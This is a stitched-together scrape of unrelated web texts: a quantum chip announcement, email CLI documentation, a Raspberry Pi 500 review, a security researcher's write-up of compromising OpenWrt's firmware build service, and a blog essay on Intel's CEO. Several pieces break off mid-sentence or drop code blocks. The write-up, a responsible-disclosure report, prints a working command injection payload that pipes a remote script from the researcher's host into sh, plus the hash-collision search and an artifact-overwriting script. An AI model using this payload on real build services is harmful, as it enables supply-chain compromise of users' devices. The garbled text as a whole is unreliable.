         }"><h2 data-block-key="cd6ib">Exponential quantum error correction — below threshold!</h2><p data-block-key="2vrg2">Errors are one of the greatest challenges in quantum computing, since qubits, the units of computation in quantum computers, have a tendency to rapidly exchange information with their environment, making it difficult to protect the information needed to complete a computation. Typically the more qubits you use, the more errors will occur, and the system becomes classical.</p><p data-block-key="2inmn">Today in <a href="https://www.nature.com/articles/s41586-024-08449-y">Nature</a>, we published results showing that <a href="https://research.google/blog/making-quantum-error-correction-work/"><b>the more qubits we use in Willow, the more we</b> <b><i>reduce</i></b><b> errors</b></a><b>, and the more quantum the system becomes</b>. We tested ever-larger arrays of physical qubits, scaling up from a grid of 3x3 encoded qubits, to a grid of 5x5, to a grid of 7x7 — and each time, using our latest advances in quantum error correction, we were able to cut the error rate in half. In other words, we achieved an exponential reduction in the error rate. This historic accomplishment is known in the field as “below threshold” — being able to drive errors down while scaling up the number of qubits. You must demonstrate being below threshold to show real progress on error correction, and this has been an outstanding challenge since <a href="https://journals.aps.org/pra/abstract/10.1103/PhysRevA.52.R2493">quantum error correction</a> was introduced by Peter Shor in 1995.</p><p data-block-key="ce88l">There are other scientific “firsts” involved in this result as well. For example, it’s also one of the first compelling examples of real-time error correction on a superconducting quantum system — crucial for any useful computation, because if you can’t correct errors fast enough, they ruin your computation before it’s done. And it’s a "beyond breakeven" demonstration, where our arrays of qubits have longer lifetimes than the individual physical qubits do, an unfakable sign that error correction is improving the system overall.</p><p data-block-key="d0fr2">As the first system below threshold, this is the most convincing prototype for a scalable logical qubit built to date. It’s a strong sign that useful, very large quantum computers can indeed be built. Willow brings us closer to running practical, commercially-relevant algorithms that can’t be replicated on conventional computers.</p><h2 data-block-key="ftphp">10 septillion years on one of today’s fastest supercomputers</h2><p data-block-key="qbvk">As a measure of Willow’s performance, we used the <a href="https://research.google/blog/validating-random-circuit-sampling-as-a-benchmark-for-measuring-quantum-progress/">random circuit sampling (RCS) benchmark</a>. Pioneered by our team and now widely used as a standard in the field, RCS is the classically hardest benchmark that can be done on a quantum computer today. You can think of this as an entry point for quantum computing — it checks whether a quantum computer is doing something that couldn’t be done on a classical computer. Any team building a quantum computer should check first if it can beat classical computers on RCS; otherwise there is strong reason for skepticism that it can tackle more complex quantum tasks. We’ve consistently used this benchmark to assess progress from one generation of chip to the next — we reported Sycamore results in <a href="https://blog.google/technology/ai/what-our-quantum-computing-milestone-means/">October 2019</a> and again recently in <a href="https://www.nature.com/articles/s41586-024-07998-6">October 2024</a>.</p><p data-block-key="66o0h">Willow’s performance on this benchmark is astonishing: It performed a computation in under five minutes that would take one of today’s <a href="https://www.olcf.ornl.gov/frontier/">fastest supercomputers</a> 10<sup>25</sup> or 10 septillion years. If you want to write it out, it’s 10,000,000,000,000,000,000,000,000 years. This mind-boggling number exceeds known timescales in physics and vastly exceeds the age of the universe. It lends credence to the notion that quantum computation occurs in many parallel universes, in line with the idea that we live in a multiverse, a <a href="https://en.wikipedia.org/wiki/The_Fabric_of_Reality">prediction</a> first made by David Deutsch.</p><p data-block-key="9o736">These latest results for Willow, as shown in the plot below, are our best so far, but we’ll continue to make progress.</p></div>

        <p data-block-key="r29ro">Our assessment of how Willow outpaces one of the world’s most powerful classical supercomputers, <a href="https://www.olcf.ornl.gov/frontier/">Frontier</a>, was based on conservative assumptions. For example, we assumed full access to secondary storage, i.e., hard drives, without any bandwidth overhead — a generous and unrealistic allowance for Frontier. Of course, as happened after we announced the first <a href="https://blog.google/technology/ai/what-our-quantum-computing-milestone-means/">beyond-classical computation in 2019</a>, we expect classical computers to keep improving on this benchmark, but the rapidly growing gap shows that quantum processors are peeling away at a double exponential rate and will continue to vastly outperform classical computers as we scale up.</p>

System engineering is key when designing and fabricating quantum chips: All components of a chip, such as single and two-qubit gates, qubit reset, and readout, have to be simultaneously well engineered and integrated. If any component lags or if two components don't function well together, it drags down system performance. Therefore, maximizing system performance informs all aspects of our process, from chip architecture and fabrication to gate development and calibration. The achievements we report assess quantum computing systems holistically, not just one factor at a time.</p><p data-block-key="11pju">We’re focusing on quality, not just quantity — because just producing larger numbers of qubits doesn’t help if they’re not high enough quality. With 105 qubits, Willow now has best-in-class performance across the two system benchmarks discussed above: quantum error correction and random circuit sampling. Such algorithmic benchmarks are the best way to measure overall chip performance. Other more specific performance metrics are also important; for example, our T<sub>1</sub> times, which measure how long qubits can retain an excitation — the key quantum computational resource — are now approaching 100 µs (microseconds). This is an impressive ~5x improvement over our previous generation of chips.

We’re optimistic that the Willow generation of chips can help us achieve this goal. So far, there have been two separate types of experiments. On the one hand, we’ve run the RCS benchmark, which measures performance against classical computers but has no known real-world applications. On the other hand, we’ve done scientifically interesting simulations of quantum systems, which have led to new scientific discoveries but are still within the reach of classical computers. Our goal is to do both at the same time — to step into the realm of algorithms that are beyond the reach of classical computers <b>and</b> that are useful for real-world, commercially relevant problems.</p></div>

        <p data-block-key="489x7">My colleagues sometimes ask me why I left the burgeoning field of AI to focus on quantum computing. My answer is that both will prove to be the most transformational technologies of our time, but advanced AI will significantly benefit from access to quantum computing. This is why I named our lab Quantum AI. Quantum algorithms have fundamental scaling laws on their side, as we’re seeing with RCS. There are similar scaling advantages for many foundational computational tasks that are essential for AI. So quantum computation will be indispensable for collecting training data that’s inaccessible to classical machines, training and optimizing certain learning architectures, and modeling systems where quantum effects are important. This includes helping us discover new medicines, designing more efficient batteries for electric cars, and accelerating progress in fusion and new energy alternatives. Many of these future game-changing applications won’t be feasible on classical computers; they’re waiting to be unlocked with quantum computing.</p>

<p dir="auto">Email message template body can also be written in MML. The MIME Meta Language was introduced by the Emacs <a href="https://www.gnu.org/software/emacs/manual/html_node/emacs-mime/Composing.html" rel="nofollow"><code>mml</code></a> ELisp module. Pimalaya <a href="https://github.com/pimalaya/core/tree/master/mml">ported it</a> in Rust.</p>
<p dir="auto">A raw email message is structured according to the <a href="https://www.rfc-editor.org/rfc/rfc2045" rel="nofollow">MIME</a> standard. This standard produces verbose, non-friendly messages. Here comes MML: it simplifies the way email message body are structured. Thanks to its simple XML-based syntax, it allows you to easily add multiple parts, attach a binary file, or attach inline image to your body without dealing with the MIME standard.</p>
<p dir="auto">For instance, this MML template:</p>
<div dir="auto" data-snippet-clipboard-copy-content="From: alice@localhost
To: bob@localhost
Subject: MML simple

<#multipart type=alternative>
This is a plain text part.
<#part type=text/enriched>
<center>This is a centered enriched part</center>
<#/multipart>"><pre><span>From</span>: <span>alice@localhost</span>
<span>To</span>: <span>bob@localhost</span>
<span>Subject</span>: MML simple

&lt;#multipart type=alternative&gt;
This is a plain text part.
&lt;#part type=<span>text/enriched&gt;</span>
&lt;center&gt;This is a centered enriched part&lt;/center&gt;
&lt;#/multipart&gt;</pre></div>
<p dir="auto">compiles into the following MIME Message:</p>
<div dir="auto" data-snippet-clipboard-copy-content="Subject: MML simple

  <summary>How to debug Himalaya CLI?</summary>
<p dir="auto">The simplest way is to use <code>--debug</code> and <code>--trace</code> arguments.</p>
<p dir="auto">The advanced way is based on environment variables:</p>
<ul dir="auto">
<li><code>RUST_LOG=&lt;level&gt;</code>: determines the log level filter, can be one of <code>off</code>, <code>error</code>, <code>warn</code>, <code>info</code>, <code>debug</code> and <code>trace</code>.</li>
<li><code>RUST_SPANTRACE=1</code>: enables the spantrace (a span represent periods of time in which a program was executing in a particular context).</li>
<li><code>RUST_BACKTRACE=1</code>: enables the error backtrace.</li>
<li><code>RUST_BACKTRACE=full</code>: enables the full error backtrace, which include source lines where the error originated from.</li>
</ul>
<p dir="auto">Logs are written to the <code>stderr</code>, which means that you can redirect them easily to a file:</p>
<div data-snippet-clipboard-copy-content="RUST_LOG=debug himalaya 2>/tmp/himalaya.log"><pre><code>RUST_LOG=debug himalaya 2&gt;/tmp/himalaya.log
</code></pre></div>

  <summary>How the wizard discovers IMAP/SMTP configs?</summary>
<p dir="auto">All the lookup mechanisms use the email address domain as base for the lookup. It is heavily inspired from the Thunderbird <a href="https://udn.realityripple.com/docs/Mozilla/Thunderbird/Autoconfiguration" rel="nofollow">Autoconfiguration</a> protocol. For example, for the email address <code>test@example.com</code>, the lookup is performed as (in this order):</p>
<ol dir="auto">
<li>check for <code>autoconfig.example.com</code></li>
<li>look up of <code>example.com</code> in the ISPDB (the Thunderbird central database)</li>
<li>look up <code>MX example.com</code> in DNS, and for <code>mx1.mail.hoster.com</code>, look up <code>hoster.com</code> in the ISPDB</li>
<li>look up <code>SRV example.com</code> in DNS</li>
<li>try to guess (<code>imap.example.com</code>, <code>smtp.example.com</code>…)</li>
</ol>

<p>When the <a data-analytics-id="inline-link" href="https://www.tomshardware.com/news/raspberry-pi-400-review-faster-cpu-new-layout-better-thermals" data-before-rewrite-localise="https://www.tomshardware.com/news/raspberry-pi-400-review-faster-cpu-new-layout-better-thermals"><u>Raspberry Pi 400</u></a> was released, the world was deeply in the grip of COVID19 and chip shortages meant that stocks of common electronics were in short supply. Including the <a data-analytics-id="inline-link" href="https://www.tomshardware.com/reviews/raspberry-pi-4" data-before-rewrite-localise="https://www.tomshardware.com/reviews/raspberry-pi-4"><u>Raspberry Pi 4</u></a>. The Raspberry Pi 400 introduced a new form factor to the Raspberry Pi range, a computer “in a keyboard.”</p><p>A computer in a keyboard wasn’t a new idea. As a kid in the 1980s, I had various Commodore machines, so I was well versed in keyboards that were computers. But for the Raspberry Pi 400 this was a bold choice, and it seems that it paid off as Raspberry Pi has now announced the $90 Raspberry Pi 500, based on the current flagship <a data-analytics-id="inline-link" href="https://www.tomshardware.com/reviews/raspberry-pi-5" data-before-rewrite-localise="https://www.tomshardware.com/reviews/raspberry-pi-5"><u>Raspberry Pi 5</u></a>.</p><p>The Raspberry Pi 500 is available on its own for $90, or as part of a $120 Desktop kit.

Just take your time, plastic spudgers, and carefully use a little heat from a hairdryer or one of the <a data-analytics-id="inline-link" href="https://www.tomshardware.com/best-picks/best-soldering-irons" data-before-rewrite-localise="https://www.tomshardware.com/best-picks/best-soldering-irons"><u>best soldering stations</u></a>.</p><p>I got in, and was greeted by a huge piece of aluminum covering the entire PCB and cradling the keyboard. This is the same setup as the Pi 400 and it will later explain why the Raspberry Pi 500’s thermal performance was so good. Removing the aluminum was a little tricky. The four screws were easy, but the thermal pad holding the aluminum heatsink to the SoC was stuck solid. A little heat, some plastic pry tools and patience won the battle. When putting it all back together, ensure that the heatsink is touching the thermal pad, otherwise the chip will not be cooled.</p><p>The PCB is very similar to the Pi 400 (a theme that permeates this review) but with the GPIO and USB ports swapped around. Looking around the board, it is hard to miss that there is a large M.2 shaped space. A space that could accommodate up to 2280 sized NVMe SSDs, or even an AI accelerator but there is a catch. There is no connector. I asked Raspberry Pi CTO Gordon Hollingworth about this, and his response was that it was a balance of functionality and performance versus cost / capability trade-off. But Hollingworth says the Raspberry Pi 50 "is a good product which hits the same market as Raspberry Pi 400."<br>Another factor in the omission of using NVMe SSDs, is that it's not exactly easy to open the case. The plastic could be easily broken, leaving you with a cosmetically damaged Raspberry Pi 500.</p><p>I also spotted an RP2-B2 chip next to the keyboard FFC connector. The RP2 is the RP2040, and the B2 stepping is the latest. This is acting as a keyboard controller, given its proximity to the keyboard FFC. Hollingworth's response being "Yes - why use a random bit of hardware when we can use our own!"</p><p>Finally, there is a large section of the PCB which is unpopulated.

It's a powerful machine, in a pleasant package. I’m old enough to remember the 1980s home computer craze, and this, just like the Pi 400, reminds me of that time. But now we have much more power. This is a great all-rounder, but like I have been saying throughout this review, it shares many good and bad things with the Pi 400 and the GPIO access and the lack of camera / display ports are the only real negatives. The omission of PCIe based storage is unfortunate, but without an easy access hatch, the plastic would soon break.</p><p>The Raspberry Pi 500 is the kit that you buy as a gift for someone, or as a child’s first computer. I can see this being used in schools and to an extent in offices around the world.</p>

    <h2 id="introduction">Introduction</h2>
<p>Hello, I’m RyotaK (<a href="https://twitter.com/ryotkak" target="_blank" rel="noopener">@ryotkak</a>
), a security engineer at Flatt Security Inc.</p>
<p>A few days ago, I was upgrading my home lab network, and I decided to upgrade the <a href="https://openwrt.org/" target="_blank" rel="noopener">OpenWrt</a>
 on my router.<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> After accessing the LuCI, which is the web interface of OpenWrt, I noticed that there is a section called <code>Attended Sysupgrade</code>, so I tried to upgrade the firmware using it.</p>
<p>After reading the description, I found that it states it builds new firmware using an online service.</p>
<center>
&nbsp; &nbsp; <img alt="The attended sysupgrade service allows to easily upgrade vanilla and custom firmware images. This is done by building a new firmware on demand via an online service." src="https://flatt.tech/research/compromising-openwrt-supply-chain-sha256-collision/01.png">
</center>
<p>At this point, I was curious about how it works, so I decided to investigate about it.</p>
<h2 id="sysupgradeopenwrtorg">sysupgrade.openwrt.org</h2>
<p>After some research, I found that the online service mentioned above is hosted at <code>sysupgrade.openwrt.org</code>. This service allows users to build a new firmware image by selecting the target device and the desired packages.<br>
When the user tries to upgrade the firmware, OpenWrt on the user side sends a request to the server with the required information including:</p>
<ul>
<li>Target architecture</li>
<li>Device profile</li>
<li>Selected packages</li>
</ul>
<p>The server then builds the firmware image based on the information and sends it back to the OpenWrt, which then flashes the firmware image to the device.</p>
<p>As you can imagine, building an image with user-provided packages can be dangerous. If the server is building the user-provided source code and is not properly isolated, it can be easily compromised.</p>
<p>So, I started to investigate if there were any security issues in the service.</p>
<h2 id="command-injection">Command injection</h2>
<p>Fortunately, the server hosted at <code>sysupgrade.openwrt.org</code> is an open-source project, and the source code is hosted at <a href="https://github.com/openwrt/asu" target="_blank" rel="noopener">openwrt/asu</a>
.<br>
I’ve set up the local instance of the service to investigate further and test the behavior of the service without impacting the production environment.</p>
<p>After reading it a bit, I found that the server is using the containers to isolate the build environment like the following:</p>
<p><a href="https://github.com/openwrt/asu/blob/ce2324a438ae8bd51856e9b6fb39578f507d2d9e/asu/build.py#L154-L164" target="_blank" rel="noopener">asu/build.py line 154-164</a>
</p>

</span></span></code></pre></div><p>I immediately noticed that the length of the hash is truncated to 12, out of 64 characters.<br>
12 characters are equivalent to 48 bits, and the key space is <code>2^48 = 281,474,976,710,656</code>, which seems to be too small to avoid collisions.</p>
<p>While this hash isn’t used as the cache key, the outer hash that includes this hash is used. So, by creating a collision of the packages’ hash, we can produce the same cache key even if the packages are different. This allows an attacker to force the server to return the wrong build artifact for requests that have different packages.</p>
<p>As I was unsure if the collision was actually possible, I decided to test it by brute-forcing the SHA-256 to find a 12-character collision.</p>
<h2 id="brute-forcing-the-sha-256">Brute-forcing the SHA-256</h2>
<p>Since I couldn’t find the hash brute-forcing tools with partial match support, I started to implement it by myself.</p>
<p>After some trial and error, I successfully made an OpenCL program to perform the brute-forcing on the GPU. However, upon testing it, the performance was terrible, it takes 10 seconds to calculate 100 million hashes.<br>
This was mostly equivalent to the hash rate of the CPU, and as I had never written an OpenCL program before, I couldn’t optimize it further.</p>
<p>So, I ended up using the known hash brute-forcing tool program called <a href="https://hashcat.net/hashcat/" target="_blank" rel="noopener">Hashcat</a>
.<br>
With the following little hack, I was able to make the Hashcat print the hashes with only 8 characters matched.</p>

<h2 id="combining-both-attacks">Combining both attacks</h2>
<p>To combine both attacks, we need to find a payload that has the 12-character hash collision against the legitimate package list.</p>
<p>I’ve gathered the package list from the <code>firmware-selector.openwrt.org</code>, which is a frontend of the <code>sysupgrade.openwrt.org</code>, and calculated the legitimate hash:</p>

</span></span></code></pre></div><p>The first 12 characters of this hash are <code>8f7018b33d94</code>, so we need to find a command injection payload that has the same prefix for the hash.</p>
<p>To find such a payload, I executed the modified version of the Hashcat on RTX 4090 with the following command:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>$ ./hashcat -m <span>1400</span> 8f7018b33d9472113274fa6516c237e32f67685fc1fc3cbdbf144647d0b3feeb -O -a <span>3</span> -w <span>3</span> <span>'`curl -L tmp.ryotak.net/?l?l?l?l?l?l?l?l?l?l|sh`'</span> --self-test-disable --potfile-disable --keep-guessing
</span></span></code></pre></div><p>After executing the command, Hashcat started to calculate hashes at the speed of around 500 million hashes per second, so I left it running.</p>
<p>When I checked the output after a while, the Hashcat calculated all possible patterns, but it didn’t find 12-character collisions. This was because I calculated the space of <code>?l?l?l?l?l?l?l?l?l?l</code> wrongly.</p>
<p><code>?l</code> is a mask pattern that generates <code>a-z</code>, so the space of <code>?l?l?l?l?l?l?l?l?l?l</code> (10 characters) is <code>26^10 = 141,167,095,653,376</code>, which is about half of <code>2^48 = 281,474,976,710,656</code>.<br>
But, while calculating the space, I incorrectly calculated it as <code>26^11 = 3,670,344,486,987,776</code>, and thought that it should be enough to find the collision.</p>
<p>So, I fixed the mask pattern to <code>?l?l?l?l?l?l?l?l?l?l?l</code> (11 characters) and left it running again. After executing the command, I wondered if I could make the brute-forcing faster, so I started to poke the Hashcat.</p>
<p>Soon, I noticed that the performance drastically increased when I moved the mask pattern to the start of the command like <code>`?l?l?l?l?l?l?l?l?l?l?l `curl -L tmp.ryotak.net/|sh`</code><br>
With a bit of testing, I confirmed that I can increase the speed about 36 times by simply changing the pattern to the following:</p>
<pre tabindex="0"><code>`?l?l?l?l?l?l?l?l?l?l?l||curl -L tmp.ryotak.net/8f7018b33d94|sh`
</code></pre><p>By using this pattern, the Hashcat was able to calculate the hashes at the speed of 18 billion hashes per second. Within an hour, the Hashcat found the 12 characters collision:</p>
<pre tabindex="0"><code>$ printf '`slosuocutre||curl -L tmp.ryotak.net/8f7018b33d94|sh`' | sha256sum
8f7018b33d9464976ab199f100812d2d24d5e84a76555c659e88e0b6989a4bd8 &nbsp;-
</code></pre><p>Sending this payload as the <code>packages</code> parameter, the command injection is triggered and the script from <code>tmp.ryotak.net</code> is executed.<br>
I placed the following script in <code>tmp.ryotak.net/8f7018b33d94</code>, which overwrites the artifact produced by the imagebuilder.</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>cat &gt;&gt; /builder/scripts/json_overview_image_info.py <span>&lt;&lt;PY
</span></span></span><span><span><span>import os
</span></span></span><span><span><span>files = os.listdir(os.environ["BIN_DIR"])
</span></span></span><span><span><span>for filename in files:

</span></span></span><span><span><span>        filepath = os.path.join(os.environ["BIN_DIR"], filename)
</span></span></span><span><span><span>        with open(filepath, "w") as f:
</span></span></span><span><span><span>            f.write("test")
</span></span></span><span><span><span>PY</span>
</span></span></code></pre></div><p>Then, as the hash collision occurred, the server returns the overwritten build artifact to the legitimate request that requests the following packages:</p>
<pre tabindex="0"><code>base-files busybox ca-bundle dnsmasq dropbear firewall4 fstools kmod-gpio-button-hotplug kmod-hwmon-nct7802 kmod-nft-offload libc libgcc libustream-mbedtls logd luci mtd netifd nftables odhcp6c odhcpd-ipv6only opkg ppp ppp-mod-pppoe procd procd-seccomp procd-ujail uboot-envtools uci uclient-fetch urandom-seed urngd
</code></pre><p>By abusing this, an attacker could force the user to upgrade to the malicious firmware, which could lead to the compromise of the device.</p>
<h2 id="reporting-the-issue">Reporting the issue</h2>
<p>After confirming the attack, I reported the issue to the OpenWrt team via <a href="https://github.com/openwrt/asu/security/advisories/new" target="_blank" rel="noopener">the private vulnerability reporting on GitHub</a>
.</p>
<p>Soon after acknowledging the issue, they stopped the <code>sysupgrade.openwrt.org</code> service temporarily and investigated the issue. Within 3 hours, they released the fixed version and restarted the service.</p>
<p>While both issues are fixed by the OpenWrt team, it was unknown if this attack was exploited by someone else because this vulnerability existed for a while.<br>
So, they decided to release <a href="http://lists.openwrt.org/pipermail/openwrt-announce/2024-December/000061.html" target="_blank" rel="noopener">an announcement</a>
 to notify the users to ensure no devices are compromised and detect if it was compromised.</p>
<h2 id="conclusion">Conclusion</h2>
<p>In this article, I explained how I could compromise the <code>sysupgrade.openwrt.org</code> service by exploiting the command injection and the SHA-256 collision.<br>
As I never found the hash collision attack in a real-world application, I was surprised that I could successfully exploit it by brute-forcing hashes.</p>
<p>I appreciate the effort of the OpenWrt team to fix the issues in an incredibly short time and notify the users promptly.</p>

                <p>By all accounts, Pat Gelsinger is affable, technically sharp, hard-working, and decent.
Those who have worked for him praise him as a singularly good manager.
In January 2021, when Gelsinger was abruptly named the CEO of Intel, this is more or less all I knew of him — and I found myself urgently needing to learn much more.</p>
<p>To understand my urgency, it’s worth rewinding the clock back to late 2019 and the earliest
days of
<a href="https://oxide.computer/">Oxide</a>.  We knew what we wanted to build, but we had some big (consequential!)
decisions to make — first among them our choice of host CPU.  Based on
what we had seen in AMD Naples and Rome, we felt that AMD was clearly outpacing Intel,
but this was a big bet and we wanted to be rigorous about it.  Even though
we felt Xeon was unlikely to be our direction, we scheduled a meeting with Intel in Santa Clara
(pre-COVID!) to understand their roadmap.</p>
<p>We wanted to take advantage of the all-day meeting to understand the other components that Intel was making
that might be relevant for us, so we also asked for roadmap briefings on NIC
silicon (Columbiaville) and switching silicon (Tofino).
The host CPU discussion ended up confirming our beliefs
(befitting our
<a href="https://oxide-and-friends.transistor.fm/episodes/rfds-the-backbone-of-oxide">writing-intensive culture at Oxide</a>
we wrote up our findings in
<a href="https://rfd.shared.oxide.computer/rfd/0012">RFD 12 Host CPU Evaluation</a>),
and the NIC discussion similarly was a dead end.  The switching silicon discussion, however,
was interesting:  Tofino was TSMC-fabbed (the only Intel part at the time fabbed outside of Intel)
and we found the programmable nature of it via
<a href="https://p4.org/">P4</a> to be really compelling.  Up until that point,
we had assumed that we would have to use Broadcom, and we weren’t thrilled at the prospects;
the idea of having not just an alternative, but one with such a novel approach was hugely
appealing.  The Tofino team at Intel was enthused by our early interest, proving itself
to be very responsive in the weeks that followed as we continued to explore the
prospects of building around their Tofino 2. The more we learned, the more we liked!</p>
<p>As we got deeper with Tofino, we did, however have a single, substantial reservation: <strong>we didn’t trust Intel to not kill it.</strong>
Intel has a long, long (long!) track record of fostering innovation outside of its mainstay
x86 product — and then killing it.
Making things more complicated, these untimely deaths are not without ambiguity:  the efforts that Intel kills are often
early and interesting — but need patience and more iterations to be able to win a broader
market.  And while the cullings are not always wrong (no amount of patience would have saved
<a href="https://bcantrill.dtrace.org/2008/07/18/revisiting-the-intel-432/">the iAPX 432</a>), the
biggest mistakes in the last two decades at Intel (namely, its failures in
mobile CPUs and discrete GPUs) are a result of discarding a flawed effort entirely rather than
learning from it and iterating.</p>
<p>Still, we loved the idea of P4 and programmable switch silicon, and we really liked the Tofino team at Intel:
we felt our teams had a shared vision for the programmable data center — and they were very accommodating
of our desire to build something very different from a commodity switch.
So despite our trepidations, we stepped over
<a href="https://www.intel.com/content/www/us/en/ark/products/codename/63546/products-formerly-red-rock-canyon.html">the desiccated carcass of Red Rock Canyon</a>, and engaged
on building a switch with Tofino.
And we didn’t (and don’t!) regret it:
it was of course
<a href="https://oxide-and-friends.transistor.fm/episodes/the-sidecar-switch-2021-11-29">brutally hard to build our own switch</a>,
but the dividends of programmability were enormous — and thanks to Tofino and P4,
<a href="https://oxide-and-friends.transistor.fm/episodes/rack-scale-networking">we were able to build some important,
unique functionality</a>.</p>
<p>But by the time Gelsinger became CEO in early 2021, our finished product was still a bit in the future:  we knew what we were
building, but we were in the thick of building it.
It was important for me to understand the incoming CEO, and if possible, to get an audience with Gelsinger to explain what we saw in Tofino (and to understand
what his vision was for programmable networking silicon).
So — and as I relayed in
<a href="https://oxide-and-friends.transistor.fm/episodes/intel-after-gelsinger">our recent podcast episode on Intel after Gelsinger</a> — I tried to learn as much as possible about
the guy in his own words.
This would normally mean binge listening podcasts, talks, interviews, etc. — but in Gelsinger’s case, I hit an early and familiar jackpot:
as part of their superlative series, the
<a href="https://computerhistory.org/">Computer History Museum</a> had a
<a href="https://www.youtube.com/watch?v=JTKkY2kZuEw">four-hour oral history with Pat Gelsinger</a>.</p>
<p>And in listening to Gelsinger, his affability clearly came across, along with his technical acumen and
depth of experience.
But something else came across too:  an indisputable undercurrent of arrogance.
Now, it’s a little hard to be critical, given the context:  the whole point of an oral history after all is for people to speak about themselves.
Still, these oral histories are most interesting when they take the opportunity to expand on failures, and
Gelsinger’s narrative of his time at Intel seemingly just went from strength to strength.  Worse,
in his own story, the bad things at Intel always seemed to happen when he wasn’t in the room or otherwise over his objections — and
the good things always when he was called in to save an effort from failure.  I’m sure this retelling has truth to it,
but I found it surprising that his narrative about AMD Opteron is of Intel conquering AMD with Nahalem under
his leadership — with no mention of Intel’s gross architectural missteps with respect to 64-bit that allowed (and even demanded!) AMD Opteron
in the first place.</p>
<p>But, fine.  Again, it’s an oral history; there’s going to be a
<a href="https://en.wikipedia.org/wiki/Rashomon_effect">Rashomon effect</a>.
And so the guy was confident; so what?
My feeling of his arrogance was still a bit amorphous
when we got to Gelsinger retelling the end of his time at Intel.
I was waiting for this, because I knew that Gelsinger had led the charge on Larrabee — and that
<a href="https://brightsideofnews.com/blog/an-inconvenient-truth-intel-larrabee-story-revealed/">Larrabee was infamously a wreck</a>.
He lamented leaving Intel because he knew that Larrabee would be killed after he departed (which it was),
but I was shocked when he said that had Intel
<a href="https://www.youtube.com/watch?v=MxZe1i8z-8Y&amp;t=1000s">"stayed with it…​ NVIDIA would be a fourth the size they are today."</a>
I was washing the dishes as I was listening to this, and it stopped me in my tracks:  I turned off the faucet, dried my hands, and backed up the recording.
Had I heard correctly?!
If one wanted to make this eyewatering claim, it must be loaded with riders and caveats: it must acknowledge that Larrabee itself
was an unusable disaster; that NVIDIA had an indisputable lead, even in 2009; that for Intel to dominate NVIDIA it would have required conjuring software
expertise and focus with which
Intel has famously struggled; that Intel had no pattern for sustained success out of x86.
On the one hand, there were enough qualifiers from Gelsinger to soften this claim a little (and at least some passing respect for
NVIDIA’s Jenson Huang and Bill Dally), but on the other…​ yes, he actually claimed that NVIDIA had <strong>his departure</strong> from Intel to thank
for (<a href="https://archive.computerhistory.org/resources/access/text/2019/06/102781086-05-01-acc.pdf">checks transcript</a>) <strong>three quarters</strong> of its size.  (Which, even in 2019 when the conversation was recorded, amounted to a whopping ~$75B!)</p>
<p>I think even the interviewers were a little taken aback, and
<a href="https://www.youtube.com/watch?v=MxZe1i8z-8Y&amp;t=1151s">asked the question directly</a>:
"Do you think that it was in part that you weren’t there to drive [Larrabee] forward that they decided to withdraw from that?"
Gelsinger’s response:  "Yeah, I’ll say that very directly."</p>
<p>This was beyond mere confidence, and was looking more like a total disregard for one’s own limitations.
Another feeling was growing inside me:  despite his many positive attributes, Gelsinger was the wrong person for the job.
And to be clear, the job in 2021 was to lead a company in crisis, viz.
the
<a href="https://assets.thirdpointlimited.com/f/166217/x/8a9b8ea40d/third-point-letter-to-intel-december-2020-tpou.pdf">letter from Third Point that precipitated the firing of Bob Swan</a>.
Intel’s strategic mistakes were (in my opinion) symptomatic of <strong>an acute cultural problem</strong>:  the company still carried with it the inherited
arrogance from an earlier age.
A concrete manifestation of the company’s arrogance is that <strong>it didn’t listen</strong>:
it didn’t listen to its own people (and therefore struggled to correct course even when the rank-and-file knew that the trajectory is wrong)
and it didn’t listen to its customers (and therefore built the wrong things for new markets — or missed out on those markets entirely).
Intel needed a leader that could confront this cultural problem directly — who could work to undo an accretion of generations of entitlement — but
if Gelsinger’s narrative for himself was any indicator, it felt like he would instead be feeding the company’s worst impulses about
its own exceptionalism.
As Gelsinger returned, I found no reassurance in the company’s narrative, which felt less like
<a href="https://www.youtube.com/watch?v=ZN12-hJI7ws">the arrival of Winston Wolf</a>,
and more like a cherished prince returning home to live out his destiny.</p>
<p>The concern that Gelsinger would be reliving his past more than navigating Intel’s future wasn’t exactly put to rest when, shortly after his arrival, Intel launched its cringy-as-hell
anti-Apple
<a href="https://www.inc.com/jason-aten/intels-ad-campaign-against-apple-is-perfect-example-of-why-its-getting-beat-so-badly.html">"Go PC" ad campaign</a>.
(It tells you everything you need to know that Intel
<a href="https://www.youtube.com/playlist?list=PLk2sjg_-F-MfQL0aUbKyDX909ZfKCUq1c">deleted the Go PC ads</a>, but then
<a href="https://www.youtube.com/@IntelCanada/search?query=gopc">forgot about Canada</a>.)  Fortunately for future historians of corporate dreck, the cringiest of these ads was
immortalized when
<a href="https://www.youtube.com/watch?v=HbkdpyUlJNs">Marques Brownlee and David Imel absolutely ripped it apart</a>.  "Go PC" was an embodiment of the arrogance
that I feared came from the top; how could <strong>anyone</strong> think that Intel’s biggest problem in 2021 was competing against…​ the Mac?!  They knew that AMD
also made x86 parts, right?!  The whole campaign frankly felt juvenile, as if they were trying to just deride Apple for their decision to
<a href="https://en.wikipedia.org/wiki/Mac_transition_to_Apple_silicon">build their own silicon</a>.</p>
<p>Much meatier than an ill-advised ad campaign was Gelsinger’s announcement that they would have
<a href="https://www.anandtech.com/show/16823/intel-accelerated-offensive-process-roadmap-updates-to-10nm-7nm-4nm-3nm-20a-18a-packaging-foundry-emib-foveros">5 process nodes in 4 years</a>.
This was — and is — an aggressive bet for a company that had an entire process node (10nm) slip for years and then
quietly fail to yield but a single product
(<a href="https://en.wikipedia.org/wiki/Cannon_Lake_(microprocessor)">Cannon Lake</a>).  From the perspective of an Intel customer, Intel had never come completely clean about
the failing of 10nm (publicly or privately); how could Intel expect outsiders to trust them to learn from their mistakes if it wouldn’t even publicly acknowledge what
those mistakes were?
I don’t think that that bet was <em>necessarily</em> the wrong bet,
but it was indisputably going to be expensive and risky.
And this gets to Gelsinger’s first real, unequivocal mistake:
<strong>he didn’t eliminate Intel’s dividend.</strong>
Eliminating the dividend would have sent an early message to
everyone — shareholders and employees — that the company’s survival was at stake, and it would have helped build the war chest for the battles to come.
While I think his dichotomy is a bit reductive,
<a href="https://hbr.org/2011/04/peacetime-ceos-vs-wartime-ceos">Ben Horowitz’s nomenclature</a> is useful here:  Intel needed a
wartime CEO — but in maintaining a dividend that it couldn’t afford, Gelsinger was committing the ultimate peacetime act.
(I am not alone in this view;
<a href="https://sharptech.fm/member/episode/gelsinger-out-at-intel-20-years-of-structural-challenges-and-strategic-blindspots-the-board-and-whats-next">Ben Thompson of Stratechery
